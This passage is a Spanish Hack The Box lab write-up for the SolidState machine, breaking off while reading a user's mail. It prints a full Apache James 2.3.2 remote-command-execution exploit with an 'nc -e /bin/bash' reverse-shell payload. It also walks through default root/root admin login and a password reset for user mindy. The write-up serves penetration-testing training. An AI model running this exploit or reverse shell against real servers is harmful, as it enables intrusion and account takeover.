@@ -1,0 +1,977 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box SolidState - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina SolidState en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box SolidState">
+<meta property="og:url" content="http://localhost:4000/htb-solidstate/">
+
+
+  <meta property="og:description" content="Resolución de la máquina SolidState en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-solidstate/solidstate.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-26T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-solidstate/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box SolidState</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box SolidState">
+    <meta itemprop="description" content="Resolución de la máquina SolidState en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="November 26, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box SolidState
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-solidstate/banner-solidstate.jpg" alt="" /></p>
+
+<h2 id="solidstate">SolidState</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.51.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.51
+PING 10.10.10.51 <span class="o">(</span>10.10.10.51<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.51: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>138 ms
+
+<span class="nt">---</span> 10.10.10.51 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 138.454/138.454/138.454/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.51 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-19 22:15 CDT
+Initiating Ping Scan at 22:15
+Scanning 10.10.10.51 <span class="o">[</span>4 ports]
+Completed Ping Scan at 22:15, 0.24s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 22:15
+Scanning 10.10.10.51 <span class="o">[</span>65535 ports]
+Discovered open port 110/tcp on 10.10.10.51
+Discovered open port 25/tcp on 10.10.10.51
+Discovered open port 80/tcp on 10.10.10.51
+Discovered open port 22/tcp on 10.10.10.51
+Discovered open port 4555/tcp on 10.10.10.51
+Discovered open port 119/tcp on 10.10.10.51
+Completed SYN Stealth Scan at 22:16, 41.11s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.51
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65529 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+119/tcp  open  nntp
+4555/tcp open  rsip
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.50 seconds
+           Raw packets sent: 71008 <span class="o">(</span>3.124MB<span class="o">)</span> | Rcvd: 70377 <span class="o">(</span>2.815MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.51
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,25,80,110,119,4555
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,25,80,110,119,4555 10.10.10.51 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-19 22:26 CDT
+Nmap scan report <span class="k">for </span>10.10.10.51
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp   open  smtp    JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>10.10.14.16 <span class="o">[</span>10.10.14.16]<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Home - Solid State Security
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+110/tcp  open  pop3    JAMES pop3d 2.3.2
+119/tcp  open  nntp    JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+4555/tcp open  rsip?
+| fingerprint-strings: 
+|   GenericLines: 
+|     JAMES Remote Administration Tool 2.3.2
+|     Please enter your login and password
+|     Login <span class="nb">id</span>:
+|     Password:
+|     Login failed <span class="k">for</span> 
+|_    Login <span class="nb">id</span>:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4555-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>10/19%Time<span class="o">=</span>616F8C6B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
+SF:enericLines,7C,<span class="s2">"JAMES</span><span class="se">\x</span><span class="s2">20Remote</span><span class="se">\x</span><span class="s2">20Administration</span><span class="se">\x</span><span class="s2">20Tool</span><span class="se">\x</span><span class="s2">202</span><span class="se">\.</span><span class="s2">3</span><span class="se">\.</span><span class="s2">2</span><span class="se">\n</span><span class="s2">P
+SF:lease</span><span class="se">\x</span><span class="s2">20enter</span><span class="se">\x</span><span class="s2">20your</span><span class="se">\x</span><span class="s2">20login</span><span class="se">\x</span><span class="s2">20and</span><span class="se">\x</span><span class="s2">20password</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20id:</span><span class="se">\n</span><span class="s2">Passw
+SF:ord:</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20failed</span><span class="se">\x</span><span class="s2">20for</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20id:</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>266.14 seconds
+</code></pre></div></div>
+
+<p>Vemos el servicio HTTP por el puerto 80, así que mediante el uso de la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> trataremos de ver que tecnologías presenta el sitio web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.51/
+http://10.10.10.51/ <span class="o">[</span>200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security]
+</code></pre></div></div>
+
+<p>Vemos que nos enfrentamos ante un <strong>Apache 2.4.25</strong>, en servidor con sistema operativo <strong>Debian</strong> y un correo electrónico <code class="language-plaintext highlighter-rouge">webadmin@solid-state-security.com</code> que viendo el dominio, no se encuentra relacionado con la plataforma de Hack The Box; así que sólo nos quedamos por el posible usuario <code class="language-plaintext highlighter-rouge">webadmin</code>. Ahora vamos a ver el contenido vía web:</p>
+
+<p><img src="/assets/images/htb-solidstate/solidstate-web.png" alt="" /></p>
+
+<p>Si tratamos de buscar por la web, no encontramos nada interesante o de relevancia. Analizando nuestra captura de <code class="language-plaintext highlighter-rouge">nmap</code>, tenemos un puerto curioso 4555 asociado al servicio <strong><em>JAMES Remote Administration Tool 2.3.2</em></strong>. A partir de este punto existen dos formas para poder ingresar a la máquina; el primero es mediante un exploit público asociado a la tecnología <strong><em>Apache James 2.3.2</em></strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit james 2.3.2
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write <span class="o">(</span>Metasploit<span class="o">)</span>           | linux/remote/48130.rb
+Apache James Server 2.3.2 - Remote Command Execution                                           | linux/remote/35513.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Lo descargamos en nuestro directorio de trabajo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> linux/remote/35513.py
+  Exploit: Apache James Server 2.3.2 - Remote Command Execution
+      URL: https://www.exploit-db.com/exploits/35513
+     Path: /usr/share/exploitdb/exploits/linux/remote/35513.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/k4miyo/Documentos/HTB/SolidState/content/35513.py
+
+
+❯ <span class="nb">mv </span>35513.py james_rce.py
+</code></pre></div></div>
+
+<p>Ahora, analizamos el exploit para ver que realiza y si es necesario realizar modificaciones para nuestro caso. El parámetro <code class="language-plaintext highlighter-rouge">payload</code> lo modificaremos para que se nos entable una reverse shell a nuestro máquina de atacate:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">'nc -e /bin/bash 10.10.14.23 443'</span>
+</code></pre></div></div>
+
+<p>Al ejecutar el exploit, vemos que nos solicita parámetros:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 james_rce.py
+<span class="o">[</span>-]Usage: python james_rce.py &lt;ip&gt;
+<span class="o">[</span>-]Exemple: python james_rce.py 127.0.0.1
+</code></pre></div></div>
+
+<p>Vamos a asignarle la dirección IP de la máquina víctima y nos ponemos en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 james_rce.py 10.10.10.51
+<span class="o">[</span>+]Connecting to James Remote Administration Tool...
+<span class="o">[</span>+]Creating user...
+<span class="o">[</span>+]Connecting to James SMTP server...
+<span class="o">[</span>+]Sending payload...
+<span class="o">[</span>+]Done! Payload will be executed once somebody logs <span class="k">in</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Ahora tenemos que esperar que alguien se loguee para que se nos entable la shell; sin embargo, para este caso no vamos a recibir ninguna solicitud, por lo que vamos a tomar otro camino siguiendo un poco el proceso del exploit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+#
+# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
+# Date: 16\10\2014
+# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
+# Vendor Homepage: http://james.apache.org/server/
+# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
+# Version: Apache James Server 2.3.2
+# Tested on: Ubuntu, Debian
+# Info: This exploit works on default installation of Apache James Server 2.3.2
+# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c1"># specify payload
+#payload = 'touch /tmp/proof.txt' # to exploit on any user 
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'nc -e /bin/bash 10.10.14.23 443'</span> <span class="c1"># to exploit only on root
+# credentials to James Remote Administration Tool (Default - root/root)
+</span><span class="n">user</span> <span class="o">=</span> <span class="s">'root'</span>
+<span class="n">pwd</span> <span class="o">=</span> <span class="s">'root'</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"[-]Usage: python </span><span class="si">%</span><span class="s">s &lt;ip&gt;</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"[-]Exemple: python </span><span class="si">%</span><span class="s">s 127.0.0.1</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">recv</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"[+]Connecting to James Remote Administration Tool..."</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">4555</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">user</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pwd</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"[+]Creating user..."</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"adduser ../../../../../../../../etc/bash_completion.d exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"quit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="k">print</span> <span class="s">"[+]Connecting to James SMTP server..."</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">25</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"ehlo team@team.pl</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"[+]Sending payload..."</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"mail from: &lt;'@team.pl&gt;</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="c1"># also try s.send("rcpt to: &lt;../../../../../../../../etc/bash_completion.d@hostname&gt;\r\n") if the recipient cannot be found
+</span>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"rcpt to: &lt;../../../../../../../../etc/bash_completion.d&gt;</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"data</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"From: team@team.pl</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"'</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"quit</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">print</span> <span class="s">"[+]Done! Payload will be executed once somebody logs in."</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Connection failed."</span>
+
+</code></pre></div></div>
+
+<p>Nos conectamos al servidor por el puerto 4555 con las credenciales <em>root : root</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ telnet 10.10.10.51 4555
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+<span class="nb">help
+</span>Currently implemented commands:
+<span class="nb">help                                    </span>display this <span class="nb">help
+</span>listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser <span class="o">[</span>username] <span class="o">[</span>password]           add a new user
+verify <span class="o">[</span>username]                       verify <span class="k">if </span>specified user exist
+deluser <span class="o">[</span>username]                      delete existing user
+setpassword <span class="o">[</span>username] <span class="o">[</span>password]       sets a user<span class="s1">'s password
+setalias [user] [alias]                 locally forwards all email for '</span>user<span class="s1">' to '</span><span class="nb">alias</span><span class="s1">'
+showalias [username]                    shows a user'</span>s current email <span class="nb">alias
+</span>unsetalias <span class="o">[</span>user]                       unsets an <span class="nb">alias </span><span class="k">for</span> <span class="s1">'user'</span>
+setforwarding <span class="o">[</span>username] <span class="o">[</span>emailaddress] forwards a user<span class="s1">'s email to another email address
+showforwarding [username]               shows a user'</span>s current email forwarding
+unsetforwarding <span class="o">[</span>username]              removes a forward
+user <span class="o">[</span>repositoryname]                   change to another user repository
+shutdown                                kills the current JVM <span class="o">(</span>convenient when James is run as a daemon<span class="o">)</span>
+quit                                    close connection
+</code></pre></div></div>
+
+<p>Con el comando <code class="language-plaintext highlighter-rouge">help</code> vemos que tenemos algunas opciones; vamos a utilizar primero <code class="language-plaintext highlighter-rouge">listusers</code> para ver los usuarios que se encuentran en el servicio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listusers
+Existing accounts 6
+user: james
+user: ../../../../../../../../etc/bash_completion.d
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</code></pre></div></div>
+
+<p>El usuario <code class="language-plaintext highlighter-rouge">../../../../../../../../etc/bash_completion.d</code> fue el que nos creo el exploit. Ahora vemos que tenemos la posibilidad de cambiar la contraseña de un usuario con el comando <code class="language-plaintext highlighter-rouge">setpassword</code>; asi que para este caso vamos a tomar al usuario <code class="language-plaintext highlighter-rouge">mindy</code> y modificaremos la contraseña como <code class="language-plaintext highlighter-rouge">mindy123</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setpassword mindy mindy123
+Password <span class="k">for </span>mindy reset
+</code></pre></div></div>
+
+<p>Ahora con esto, podemos ingresar al servicio POP3 por el puerto 110 como el usuario <code class="language-plaintext highlighter-rouge">mindy</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+USER mindy
++OK
+PASS mindy123
++OK Welcome mindy
+</code></pre></div></div>
+
+<p>Ya nos encontramos como el usuario <code class="language-plaintext highlighter-rouge">mindy</code> dentro dle servicio POP3, ahora con el comando <code class="language-plaintext highlighter-rouge">LIST</code> podemos ver los correos del usuario y con <code class="language-plaintext highlighter-rouge">RETR [id]</code> podemos ver el contenido de los mismos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LIST
++OK 2 1945
+1 1109
+2 836
+RETR 1                         
